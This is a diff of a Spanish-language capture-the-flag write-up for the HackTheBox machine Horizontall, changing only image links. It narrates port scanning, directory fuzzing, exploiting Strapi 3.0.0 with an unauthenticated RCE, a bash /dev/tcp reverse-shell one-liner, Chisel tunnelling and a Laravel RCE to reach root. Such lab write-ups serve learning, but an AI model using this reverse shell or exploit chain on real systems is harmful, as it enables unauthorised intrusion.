@@ -19,18 +19,18 @@ nmap -p- -sS -Pn -n --open --min-rate 5000 [IP] -oN GenPort_scan
 nmap -sCV -p... [IP] -oN DetPort_scan
 ```
 
-![[Pasted image 20251009185743.png]]
+![](../imgs/Pasted image 20251009185743.png)
 
 Encontramos el puerto 80 abierto, que como ya sabemos corre el servicio http. Además también encontramos el puerto 22 abierto que hace referencia a SSH. Primeramente vamos a checar la pagina web que está corriendo por eses puerto. 
 
-![[Pasted image 20251009190030.png]]
+![](../imgs/Pasted image 20251009190030.png)
 
 
 Como en otras ocasiones veemos que nos está incluyendo directamente el nombre del dominio en lugar de la IP por lo que tenemos que indicar que la IP está ligada al dominio **horizontall.htb**. En este caso tenemos que agregar el dominio a la ruta de **[[etc-hosts]]**.
-![[Pasted image 20251009194137.png]]
+![](../imgs/Pasted image 20251009194137.png)
 
 Ya tenemos acceso al contenido...
-![[Pasted image 20251009194212.png]]
+![](../imgs/Pasted image 20251009194212.png)
 
 **Inspeccionamos la pagina pero no encontramos absolutamente nada util...**
 
@@ -41,57 +41,57 @@ Ya que no encontramos nada relevante pasaremos a hacer un ataque de **fuerza bru
 
 Para esta fase utilizaremos [[wfuzz]]
 
-![[Pasted image 20251009195824.png]]
+![](../imgs/Pasted image 20251009195824.png)
 ```bash
 wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://horizontall.htb/FUZZ"
 ```
 
 No encontramos ni una ruta relevante por lo que inspeccionamos el codigo...
 
-![[Pasted image 20251009200232.png]]
+![](../imgs/Pasted image 20251009200232.png)
 
 Se veía así, por lo que mejor mandamos a traerlo con **curl** y posteriormente le pasamos un **htmlq -p** para que se viera mejor. 
 
-![[Pasted image 20251009200350.png]]
+![](../imgs/Pasted image 20251009200350.png)
 
 Encontramos que hay algunas rutas por lo que filtramos con grep, etc.. para quedarnos con las tuas 'app' que parecen ser de aplicación..
 
 el ersultado fue...
 
-![[Pasted image 20251009200522.png]]
+![](../imgs/Pasted image 20251009200522.png)
 
 entramos a la ruta '.js'...
 
-![[Pasted image 20251009200708.png]]
+![](../imgs/Pasted image 20251009200708.png)
 
 Procedimos a buscar a ver si encontrabamos algo que tuviera relación con el dominio **.htb** por lo que utilizamos la herramienta de busqueda de Firefox para buscar el dominio. 
 
 Encontramos...
 
-![[Pasted image 20251010130326.png]]
+![](../imgs/Pasted image 20251010130326.png)
 
 Obtuvimos la ruta: ```http://api-prod.horizontall.htb/reviews```La agregamos al [[etc-hosts]] y accedemos a ella...
 
 Nos topamos con una ruta en formato [[json]] 
 
-![[Pasted image 20251010131047.png]]
+![](../imgs/Pasted image 20251010131047.png)
 Lo mandamos a llamar con curl y lo visualizamos con **jq**. 
 **JQ** nos va a servir para visualizar JSON's de manera más bonita y limpia. 
 
-![[Pasted image 20251010131203.png]]
+![](../imgs/Pasted image 20251010131203.png)
 
 Seguimos investigando toda la ruta... y por el momento estamos en api-prod.horizontall.htb/reviews, por ende, podríamos ver que otras rutas además de reviews hay... En el raíz no hay nada..
-![[Pasted image 20251010131328.png]]
+![](../imgs/Pasted image 20251010131328.png)
 
 Vamos a hacer [[Fuzzing]] nuevamente con [[wfuzz]]. 
 
 encontramos...
 
-![[Pasted image 20251010131459.png]]
+![](../imgs/Pasted image 20251010131459.png)
 
 Al probar con admin nos redirige a... **[[Strapi]]**
 
-![[Pasted image 20251010131610.png]]
+![](../imgs/Pasted image 20251010131610.png)
 
 **users** se muestra como forbidden...
 
@@ -99,21 +99,21 @@ Antes de investigar qué es Strapí, vamos a buscar más rutas ya que esa ruta a
 
 Se encontraron rutas alternativas a **/auth**:
 
-![[Pasted image 20251010132135.png]]
+![](../imgs/Pasted image 20251010132135.png)
 
 no encontramos nada muy relevante con esas rutas, sin embargo si pudimos encontrar la versión de Strapi dentro de **init**
 
-![[Pasted image 20251010132244.png]]
+![](../imgs/Pasted image 20251010132244.png)
 
 
 buscamos si hay algo relacionado a [[Strapi]] 3.0.0 con [[searchsploit]]
 
-![[Pasted image 20251010132311.png]]
+![](../imgs/Pasted image 20251010132311.png)
 Hay un exploit de RCE (UNAUTHENTICATED).
 
 Nos lo copiamos a nuestra maquina y lo ejecutamos.
 
-![[Pasted image 20251010132812.png]]
+![](../imgs/Pasted image 20251010132812.png)
 
 al parecer el RCE es ciego, es decir... no vemos nada en pantalla, para ver si efectivamente sirve nos vamos a tirar un **ping -c 1** a nosotros mismos para ver si hay conexión...
 
@@ -123,7 +123,7 @@ vamos a ponernos en escucha con [[tcpdump]] ponemos la tun0 ya que es la vpn la 
 tcpdump -i tun0 -n icmp
 ```
 
-![[Pasted image 20251010135644.png]]
+![](../imgs/Pasted image 20251010135644.png)
 
 Sí hay ejecución de comandos por lo que proseguimos a hacer una [[Reverse shell.]]
 vamos a entablarnos una shell con un archivo sh desde nuestra computadora. 
@@ -134,10 +134,10 @@ bash -i >& /dev/tcp/ip/port/ 0>&1
 ```
 
 
-![[Pasted image 20251010140134.png]]
+![](../imgs/Pasted image 20251010140134.png)
 
 nos ponemos en escucha con [[NETCAT]].
-![[Pasted image 20251010140410.png]]
+![](../imgs/Pasted image 20251010140410.png)
 Y ganamos conexión.
 
 Estabilizamos la TTY y pasamos a postexplotación.
@@ -151,7 +151,7 @@ nestat -nat
 
 los puertos de nuestro equipo y las conexiones establecidas. 
 
-![[Pasted image 20251010141335.png]]
+![](../imgs/Pasted image 20251010141335.png)
 
 vemos que hay algo corriendo por el 8000, por lo que necesitamos ver que hay, sin embargo, únicamente lo prodiamos ver con curl, ya que al estar en la  red interna, no tenemos acceso a él. 
 
@@ -160,11 +160,11 @@ Para eso ocupamos [[Chisel]], nos lo compartimos a través de un servidor **pyth
 Montamos el tunel.
 y entablamos conexión
 
-![[Pasted image 20251010145109.png]]
+![](../imgs/Pasted image 20251010145109.png)
 
 Ahora si inspeccionamos el localhost:8000 vemos algo que dice [[Laravel]]. 
 
-![[Pasted image 20251010145154.png]]
+![](../imgs/Pasted image 20251010145154.png)
 
 buscamos en [[searchsploit]] algo relacionado a Laravel ya que además tenemos la versión, encontramos diferentes exploits, por lo que ahora buscamos más relacionado a Laravel. 
 
@@ -174,4 +174,4 @@ ejecutamos el epxploit y es un RCE por lo que nos mandamos una [[Reverse shell]]
 
 lo ejecutamos y ganamos acceso a root:
 
-![[Pasted image 20251010152043.png]]
+![](../imgs/Pasted image 20251010152043.png)
